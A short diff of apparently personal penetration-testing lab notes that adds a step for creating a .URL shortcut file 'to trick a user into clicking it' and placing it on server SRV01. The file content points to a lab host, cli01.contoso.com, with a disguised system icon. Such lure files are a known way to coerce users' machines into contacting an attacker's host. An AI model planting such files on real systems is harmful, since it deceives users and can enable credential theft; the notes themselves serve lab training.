@@ -1,7 +1,8 @@
-
+ Now you are going to create a shortcut file to trick a user into clicking it… You will then place it on SRV01…
+click.URL containing : 
 [{000214A0-0000-0000-C000-000000000046}] Prop3=19,2 [InternetShortcut] IDList= URL=http://cli01.contoso.com/ IconIndex=234 HotKey=0 IconFile=C:\Windows\System32\SHELL32.DLL
 
-click.URL
+
 
 
 ![[Pasted image 20231010211230.png]]
